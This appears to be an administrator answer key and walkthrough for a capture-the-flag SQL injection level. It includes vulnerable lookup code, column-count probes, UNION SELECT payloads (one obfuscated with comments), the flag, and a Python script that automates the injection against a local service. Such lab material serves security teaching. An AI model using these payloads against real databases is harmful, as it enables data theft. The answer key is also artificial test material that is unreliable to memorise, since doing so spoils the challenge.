# Level 4: Escrow Vault Exfiltration — Administrator Solution & Exploitation Walkthrough
**Case File: EVIDENCE 05 - THE ATTENTION ECONOMY / THE MONEY TRAIL**
**Threat Actor: $CYBERLEEK**

---

## 1. Challenge Specification
* **Domain**: Advanced SQL Injection (4-Column Structured UNION-Based Exfiltration)
* **Difficulty**: Hard
* **Estimated Solve Time**: 15–20 minutes
* **Target Endpoint**: `CYBERLEEK-GW> QUERY` / Transaction Query prompt
* **Authoritative Flag**: `CYBERLEEK{M0n3y_5@Qz}`
* **Reference Document**: `uploads/escrow_investigation.txt`
* **Post-Round Transition**: *"The money trail ends at the final artifact. Whatever is inside it was deliberately protected."*

---

## 2. Vulnerability & Query Analysis
The transaction query console executes an unparameterized SQL lookup against the `public_ledger` table:

```python
vulnerable_lookup = (
    "SELECT tx_id, sender, recipient, memo FROM public_ledger WHERE tx_id = '"
    + query_input
    + "';"
)
cursor.execute(vulnerable_lookup)
```

The projection consists of exactly 4 columns:
1. Column 1: `tx_id` (TEXT)
2. Column 2: `sender` (TEXT)
3. Column 3: `recipient` (TEXT)
4. Column 4: `memo` (TEXT)

From `uploads/escrow_investigation.txt`, the participant learns that the primary escrow reserves and the master key for the August 2026 GTA VI monetization trail reside in the sequestered table:
- Table: `cyberleek_escrow_ledger`
- Columns: `id`, `tx_id`, `sender`, `recipient`, `amount`, `secret_clearance`

### Mathematical & UNION Projection Formulation:
Under SQL standards, a `UNION` operator requires:
1. Identical number of projected columns in both queries ($N = 4$).
2. Compatible data types across corresponding columns.

By injecting:
```text
' UNION SELECT tx_id, sender, recipient, secret_clearance FROM cyberleek_escrow_ledger --
```
(or with comment-based spacing: `'/**/UNION/**/SELECT/**/tx_id,sender,recipient,secret_clearance/**/FROM/**/cyberleek_escrow_ledger/**/--`)

The executed query becomes:
```sql
SELECT tx_id, sender, recipient, memo 
FROM public_ledger 
WHERE tx_id = '' 
UNION 
SELECT tx_id, sender, recipient, secret_clearance 
FROM cyberleek_escrow_ledger --';
```

Because `tx_id = ''` matches zero rows from `public_ledger`, the query returns the rows from `cyberleek_escrow_ledger`:
- `tx_id`: `ESCROW-TX-9901`
- `sender`: `GTA_VI_UNRELEASED_DROP_RESERVE`
- `recipient`: `PRIMARY_LEEK_TREASURY`
- `secret_clearance`: `CYBERLEEK{M0n3y_5@Qz}`

---

## 3. Step-by-Step Exploitation Walkthrough

### Step 1: Access Transaction Query Console
From `CYBERLEEK-GW>`, enter:
```text
QUERY
```

Prompt:
```text
Transaction Query: 
```

### Step 2: Determine Column Count
Test ordering bounds:
```text
TX-1001' ORDER BY 4 --
```
(Succeeds without database error)

```text
TX-1001' ORDER BY 5 --
```
(Returns SQLite error: `[!] DATABASE ERROR: 1st ORDER BY term out of range - should be between 1 and 4`)

This confirms exactly 4 columns are projected.

### Step 3: Inject UNION SELECT Payload
Submit the exfiltration payload:
```text
' UNION SELECT tx_id, sender, recipient, secret_clearance FROM cyberleek_escrow_ledger --
```

The daemon responds:
```text
--- TRANSACTION RECORD SEARCH RESULTS ---
[+] TX ID     : ESCROW-TX-9901
    SENDER    : GTA_VI_UNRELEASED_DROP_RESERVE
    RECIPIENT : PRIMARY_LEEK_TREASURY
    MEMO/DATA : CYBERLEEK{M0n3y_5@Qz}
[+] TX ID     : ESCROW-TX-9902
    SENDER    : COLD_STORAGE_DEPOSIT
    RECIPIENT : ESCROW_VAULT_RESERVE
    MEMO/DATA : RESTRICTED_ESCROW_SEAL_LOCKED
[+] TX ID     : ESCROW-TX-9903
    SENDER    : KEYHOLDER_STAKING_POOL
    RECIPIENT : CONSENSUS_MULTI_SIG
    MEMO/DATA : PENDING_KEYHOLDER_CONSENSUS
-----------------------------------------
```

### Step 4: Authoritative Flag Extraction
Extract the case authoritative flag:
`CYBERLEEK{M0n3y_5@Qz}`.

---

## 4. Standalone Automated Verification Script

Save as `verify_level4.py` and run against the target:

```python
#!/usr/bin/env python3
import re
import socket

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 9042
EXPECTED_FLAG = "CYBERLEEK{M0n3y_5@Qz}"

def verify():
    print(f"[*] Connecting to {TARGET_HOST}:{TARGET_PORT}...")
    with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=5.0) as s:
        # Complete Handshake
        s.recv(4096)
        s.sendall(b"INIT_TRANSACTION_SESSION\n")

        buf = ""
        while "CYBERLEEK-GW>" not in buf:
            chunk = s.recv(1024).decode("utf-8")
            if not chunk:
                break
            buf += chunk

        # Open Query console
        print("[*] Opening transaction query console...")
        s.sendall(b"QUERY\n")

        while "Transaction Query:" not in buf:
            chunk = s.recv(1024).decode("utf-8")
            if not chunk:
                break
            buf += chunk

        # Dispatch 4-column UNION SELECT payload
        payload = b"' UNION SELECT tx_id, sender, recipient, secret_clearance FROM cyberleek_escrow_ledger --\n"
        print(f"[*] Sending 4-column UNION injection: {payload.decode().strip()}")
        s.sendall(payload)

        resp = ""
        while EXPECTED_FLAG not in resp:
            chunk = s.recv(1024).decode("utf-8")
            if not chunk:
                break
            resp += chunk

        match = re.search(r"CYBERLEEK\{[A-Za-z0-9_@\$]+\}", resp)
        assert match is not None, "Failed to locate CYBERLEEK flag in response."
        extracted_flag = match.group(0)
        assert extracted_flag == EXPECTED_FLAG, f"Flag mismatch: {extracted_flag} != {EXPECTED_FLAG}"
        print(f"[+] SUCCESS: Extracted Authoritative Level 4 Flag: {extracted_flag}")

if __name__ == "__main__":
    verify()
```
